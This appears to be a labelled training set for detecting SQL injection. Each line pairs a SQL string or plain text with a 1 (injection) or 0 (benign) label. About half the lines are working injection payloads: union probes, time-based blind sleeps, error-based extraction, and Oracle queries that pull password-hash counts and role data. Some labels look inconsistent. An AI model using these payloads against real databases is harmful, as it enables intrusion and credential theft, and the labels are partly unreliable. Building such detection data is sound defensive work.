1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'vvxk'  =  'vvxk;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i;1
SELECT * FROM dozen WHERE verb NOT LIKE 'clothing%';0
-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--;1
1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--;1
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1";1
1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +';1
"-3856""  )   as iyzl where 7394  =  7394 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --";1
1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814;1
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr;1
ORDER BY 17--;1
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw;1
"1""   )    )     )   union all select null,null,null,null,null#";1
1'  )   as najc where 5213  =  5213 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --;1
"UPDATE employees SET quantity = '2023-01-01' WHERE quantity = 456;";0
1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""qcqx"" like ""qcqx";1
SELECT * FROM section ORDER BY wing, himself;0
SELECT compound ( s )  FROM press UNION;0
SELECT * FROM thee 3 SELECT * FROM molecular;0
-3859  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  5846  =  5846;1
SELECT * FROM porch WHERE Price NOT BETWEEN 10 AND 20;0
1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
"SELECT status, name FROM products WHERE price = 'active';";0
"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx";1
1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427;1
INSERT INTO total  ( replied, job, settlers )  VALUES  ( 'fastened', 'scale', 'pond' )  ;0
SELECT magic ( s )  FROM oxygen LEFT JOIN;0
' or '' ';1
SELECT reason AS essential, grew AS [wheat]  FROM distance;0
4,28E+15;0
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20;0
UPDATE shade SET scene =  'failed', City =  'herself' WHERE fastened =  fear;0
SELECT * FROM stems FETCH FIRST 3 ROWS ONLY;0
1' or sleep  (  5  ) ;1
1'||  (  select 'fjlg' from dual where 9517  =  9517;1
1'  )   as rqzz where 4987  =  4987 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --;1
"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf";1
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1";1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i;1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
1%'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  '%'  =  ';1
SELECT balance, order, roadFROM hospital WHERE muscle  IS NOT NULL;0
isabel;0
SELECT * FROM several WHERE instance NOT BETWEEN 'lay' AND 'ran';0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i;1
1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --;1
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """;1
select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#;1
SELECT * FROM expect WHERE ought BETWEEN '1996-07-01' AND '1996-07-31';0
SELECT * FROM building WHERE shallow = 'aloud' FETCH FIRST 3 ROWS ONLY;0
INSERT INTO highway  ( cheese, age, pale )  VALUES  ( 'gun', 'mix', 'fast' )  ;0
-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#;1
apotrerar;0
SELECT * FROM private WHERE mental IN  ( SELECT thousand FROM silence ) ;0
"1""  )   as rovd where 3764  =  3764 and elt  (  4249  =  4249,7259  )  --";1
SELECT AVG ( too ) FROM buffalo;0
48551498q;0
select   (  case when   (  3336  =  9781  )   then 3336 else 1/  (  select 0  )   end  )  --;1
anything' or 'x'  =  'x;1
"SELECT id, user_id, status, price FROM inventory WHERE price = 456;";0
"1%""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx;1
"DELETE FROM logs WHERE id = '2023-01-01';";0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh""  =  ""hjxh";1
"SELECT user_id, quantity FROM sessions WHERE name = 'active';";0
1  )   where 9206  =  9206 union all select null,null,null,null,null,null#;1
4644;0
1'||  (  select 'homm' where 4937  =  4937 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #;1
or ''-';1
SELECT MIN ( buried )  AS clothing FROM call;0
SELECT scientist ( s )  FROM shop SELECT author ( s ) ;0
SELECT * FROM announced;0
1'+  (  select syrz where 7699  =  7699 union all select null,null,null#;1
"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ";1
UPDATE everybody SET wise = 'rapidly'WHERE discover = 'pattern';0
SELECT MIN ( might )  AS famous FROM soap;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10;1
SELECT * FROM section ORDER BY wing, himself;0
"1""  )   where 3122  =  3122 and sleep  (  5  )  #";1
SELECT * FROM  ( SELECT say FROM fire ) ;0
SELECT * FROM silent WHERE society = 'failed' FETCH FIRST 3 ROWS ONLY;0
rocky;0
-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#;1
38728859x;0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
1464;0
or 0  =  0 #;1
65236882g;0
1'||  (  select 'hbho' from dual where 7193  =  7193;1
SELECT * FROM itself FETCH FIRST 50 PERCENT ROWS ONLY;0
ondulada, 121;0
"SELECT name FROM products WHERE quantity = 'Sample text';";0
corey;0
select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19;1
select * from users where id  =  1 +$ . or 1  =  1 -- 1;1
" select * from users where id  =  1 or "".;"" or 1  =  1 -- 1";1
1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841;1
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  ';1
1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf;1
1%'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  ';1
"-3828%""   )    )     )   or make_set  (  1765  =  8657,8657  )   and    (    (     (  ""%""  =  """;1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6;1
SELECT Count ( * )  AS shells;0
1 where 5691  =  5691 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --;1
"INSERT INTO customers (user_id, email, price) VALUES ('pending', '2023-01-01', 'john@example.com');";0
SELECT AVG ( excited ) FROM industry SELECT SUM ( mouse ) ;0
SELECT earn ( s )  FROM close;0
"select sleep  (  5  )   and   (  ""%""  =  """;1
1'+  (  select 'jhce' where 1117  =  1117 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +';1
SELECT art,announced,dug FROM verb LEFT JOIN Orders ON solve.compositionID =  tax.general ORDER BY railroad.dangerous;0
SELECT * FROM poet 3 SELECT * FROM yourself;0
SELECT second;0
1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --;1
lucar planes;0
"INSERT INTO users (created_at, name) VALUES ('pending', 'active');";0
""" or ""x""=""x";1
SELECT * FROM nature 3;0
SELECT TOP 3 * FROM consonant WHERE funny = 'common' SELECT * FROM spoken;0
SELECT * FROM else WHERE proud BETWEEN 'parts' AND 'first';0
SELECT Orders.machineryrID, Employees.clock, Employees.merely FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.taxID ORDER BY Orders.badlyID;0
"INSERT INTO logs (email, quantity, status) VALUES (456, 'Sample text', 'pending');";0
"23 or 1  =  1; --";1
igal;0
"DELETE FROM products WHERE price = 123;";0
1'  )   rlike sleep  (  5  )  #;1
"UPDATE products SET id = 'john@example.com' WHERE price = 'active';";1
select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1';1
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --;1
SELECT building ( s )  FROM eaten SELECT write ( s ) ;0
1'  )   as dvoy where 7906  =  7906 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --;1
1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  ';1
1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --;1
31819774x;0
"SELECT * FROM heard WHERE certainly BETWEEN ""place"" AND    ""ruler""";0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz";1
"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--";1
select * from information_schema.tables--;1
SELECT * FROM friend 3 SELECT * FROM percent;0
"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """;1
"1""  )   where 1666  =  1666 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --";1
SELECT town ( s )  FROM whom UNION;0
1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
SELECT * FROM island WHERE green = 'secret' LIMIT 3;0
"1""  )   where 9461  =  9461 union all select null,null,null,null,null,null,null,null,null#";1
1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ;1
ORDER BY 23;1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--;1
SELECT applied FROM brief UNION SELECT voice FROM sets ORDER BY average;0
select   (  case when   (  2716  =  8138  )   then 2716 else 2716*  (  select 2716 from mysql.db  )   end  )  #;1
SELECT COUNT ( made ) FROM promised;0
"1""   )    )    union all select null,null,null,null,null,null,null#";1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--;1
1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
1' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --;1
SELECT * FROM tonight WHERE potatoes = 'ride'  AND  ( shadow = 'play' OR cage = 'toward' ) ;0
1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo;1
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe;1
"UPDATE orders SET status = 'john@example.com' WHERE quantity = 'pending';";0
"INSERT INTO orders (id, quantity, status, email) VALUES ('2023-01-01', 'user123', 'active', 456);";0
1  )   where 2170  =  2170;1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye";1
ORDER BY 31337;1
SELECT * FROM greatly WHERE feel = 'park' FETCH FIRST 3 ROWS ONLY;0
1' where 7504  =  7504 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --;1
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866;1
SELECT guide, troops, condition FROM crew WHERE piece  IS NULL;0
 or 1  =  1 --;1
SELECT AVG ( long ) FROM heavy SELECT SUM ( bright ) ;0
SELECT * FROM place;0
select * from generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   limit 1--;1
calle barrio carmelo 21,;0
SELECT * FROM hearing WHERE Price NOT BETWEEN 10 AND 20;0
"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#";1
"DELETE FROM employees WHERE price = 'pending';";0
SELECT clearly ( s )  FROM somebody UNION;0
1  )   as hhly where 2906  =  2906;1
"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""diiv""  =  ""diiv";1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#;1
SELECT * FROM quarter WHERE although = 'grow';0
SELECT * FROM thin WHERE    NOT object = 'reason';0
"UPDATE inventory SET description = '2023-01-01' WHERE created_at = 'user123';";0
-3954'   )    )    union all select 2417,2417--;1
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv";1
1  )   where 2543  =  2543;1
SELECT twice;0
63171354z;0
SELECT * FROM rhythm ORDER BY favorite;0
SELECT * FROM expect WHERE ought BETWEEN '1996-07-01' AND '1996-07-31';0
1'   )    )    as eymg where 7000  =  7000;1
spencer;0
ORDER BY 26--;1
SELECT * FROM dot WHERE hungry = 'threw';0
6,05E+15;0
1' in boolean mode  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  #;1
1  )   as wbcd where 9506  =  9506 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --;1
SELECT * FROM something ORDER BY earth;0
"DELETE FROM sessions WHERE id = 123;";0
1  )   as oknr where 3228  =  3228;1
1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621;1
-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;1
c/ elvas 112, 13-a;0
-4304' where 1005  =  1005 union all select 1005,1005#;1
1'  )   where 3893  =  3893;1
@variable;1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  ';1
"1""   )    )    as jebl where 3464  =  3464";1
SELECT nation FROM rising UNION ALL SELECT freedom FROM pool ORDER BY dirt;0
5215;0
SELECT Count ( * )  AS leave;0
"DELETE FROM inventory WHERE id = 456;";0
" select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1";1
66837882c;0
1 where 1015  =  1015;1
"SELECT id, user_id, status, price FROM inventory WHERE price = 456;";0
SELECT * FROM note 3;0
SELECT * FROM needs WHERE here = 'deer'  OR situation = 'donkey';0
desc;1
"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea";1
SELECT left, command, respect FROM sail WHERE worried  IS NULL;0
SELECT COUNT ( DISTINCT facing )  FROM fifty;0
"INSERT INTO employees (user_id, status, created_at) VALUES ('2023-01-01', 'pending', 456);";0
1' in boolean mode  )   union all select null,null,null#;1
-6843' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'eeff'  =  'eeff;1
SELECT AVG ( too ) FROM buffalo;0
SELECT TOP 50 PERCENT * FROM tail;0
SELECT * FROM previous WHERE climb LIKE '%tube%';0
8708;0
SELECT COUNT ( because ) FROM exact;0
SELECT * FROM hurried WHERE lead = 'began'  OR dark = 'green';0
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn";1
"1""  )   where 2088  =  2088 union all select null,null,null,null--";1
SELECT * FROM combination ORDER BY dark, pile;0
1' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
-4775'  )   or 3038  =  3038;1
SELECT COUNT ( DISTINCT pupil )  FROM movement;0
"DELETE FROM employees WHERE status = 'user123';";0
SELECT occur, was, castFROM make WHERE outline  IS NOT NULL;0
SELECT * FROM twenty WHERE court NOT IN  ( 'yesterday', 'blind', 'evidence' )  ;0
SELECT * FROM flame WHERE men BETWEEN since09/01/1996minute AND teeth15/31/1996rocky;0
SELECT * FROM occur 3;0
-8523  )   as hzqs where 8944  =  8944 order by 1--;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i;1
||		(double pipe) concatenate;1
SELECT COUNT ( park ) FROM title;0
1'  )   as yyyb where 1705  =  1705 and   (  8770  =  6988  )  *6988--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18;1
SELECT airplane;0
